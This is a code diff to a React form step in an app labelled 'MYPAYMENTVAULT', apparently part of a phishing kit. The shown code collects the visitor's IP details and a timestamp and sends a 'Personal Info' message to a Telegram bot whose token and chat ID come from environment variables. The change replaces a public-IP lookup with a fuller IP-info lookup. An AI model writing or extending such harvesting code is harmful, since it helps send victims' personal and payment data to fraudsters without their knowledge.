@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, Upload } from "lucide-react";
-import { sendTelegram, getPublicIP } from "@/lib/telegram";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 
 const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
 const CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;
@@ -103,7 +103,7 @@ export default function Step4() {
     setLoading(true);
 
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip  = await getPublicIP();
+    const ip  = await getIPInfo();
 
     await sendTelegram(
       `📋 <b>MYPAYMENTVAULT - Step 4: Personal Info</b>\n\n` +
